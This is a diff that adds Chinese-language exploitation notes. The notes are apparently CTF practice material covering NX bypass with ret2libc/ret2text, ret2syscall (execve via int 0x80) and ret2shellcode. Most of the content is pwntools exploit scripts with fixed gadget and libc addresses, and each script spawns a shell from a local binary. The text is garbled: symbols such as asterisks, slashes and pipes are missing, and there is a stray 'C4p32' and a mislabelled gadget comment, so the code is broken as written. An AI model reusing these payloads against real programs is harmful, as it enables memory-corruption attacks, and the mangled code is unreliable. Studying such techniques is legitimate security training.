@@ -1,0 +1,95 @@
+x86-64 NX保护绕过 return2text
+方法一
+ROPgadget --binary .overflow2 --only popret  grep rdi -- pop rdi; ret
+偏移量 + (pop_rdi_ret) + (bin_sh_address) + (system_address)
+from pwn import 
+ 
+p = process('.nx1')
+ 
+sys_addr = 0x7ffff7e3aff0
+sh_addr = 0x7ffff7f77cee
+pop_rdi = 0x40123b
+ 
+payload = 'A'  72 + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
+ 
+p.recvuntil('So plz give me your shellcode')
+p.sendline(payload)
+p.interactive()
+
+方法二 
+from pwn import 
+ 
+p = process('.nx1')
+p.recvuntil(shellcode)
+ 
+#load libc.so.6
+elf = ELF('libc.so.6')#ldd filename
+ 
+#system offset  in libc
+system_in_libc = elf.symbols['system']
+#'binsh' offset in libc
+bin_sh_in_libc = next(elf.search('binsh'))
+ 
+#libc  base address
+libc_base = 0x00007ffff7df4000
+#pop rip;ret address
+gadget_addr =  0x000000000040123b
+#system_addr in process
+system_addr = libc_base + system_in_libc
+#'binsh' address in process
+bin_sh_addr = libc_base + bin_sh_in_libc
+ 
+print hex(system_addr) +'----'+hex(bin_sh_addr)
+ 
+payload = 'A'72                                                
+payload += p64(gadget_addr)
+payload += p64(bin_sh_addr)
+payload += p64(system_addr)
+ 
+#with open('poc','wb') as f 
+#    f.write(buf)
+ 
+p.sendline(payload)
+p.interactive()
+
+x86 NX保护绕过 return2text
+payload = p32(溢出偏移量) + p32(system_addr) + C4p32(main_addr) + p32(bin_addr)
+
+x86 NX 保护绕过-return to systemcall
+系统调用号，即 eax 应该为 0xb
+第一个参数，即 ebx 应该指向 binsh 的地址，其实执行 sh 的地址也可以。
+第二个参数，即 ecx 应该为 0
+第三个参数，即 edx 应该为 0
+
+execve(binsh,NULL,NULL)
+
+ROPgadget --binary rop  --only 'popret'  grep 'eax'
+ropper --file filename --search int 0x80
+ROPgadget --binary rop  --string 'binsh' 
+ROPgadget --binary rop  --only 'int'
+
+0xb 为 execve 对应的系统调用号
+
+from pwn import 
+
+sh = process('.rop')
+
+pop_eax_ret = 0x080bb196
+pop_edx_ecx_ebx_ret = 0x0806eb90
+int_0x80 = 0x08049421
+binsh = 0x80be408
+payload = flat(
+    ['A'  112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+sh.sendline(payload)
+sh.interactive()
+
+x86 return2shellcode
+from pwn import  
+
+p = process('.ret2shellcode') 
+
+context.binary = '.ret2shellcode' #因为要使用asm模块，所以要声明好
+#接下来这句有点复杂，用到了ljust方法，意思是asm编辑过的shellcode左对齐，总长度为112字节，剩余的地方用a补齐，这样就能保证后面的返回地址覆盖正确
+p.sendline(asm(shellcraft.sh()).ljust(112,'a') + p32(0x804A080))
+p.interactive()
+
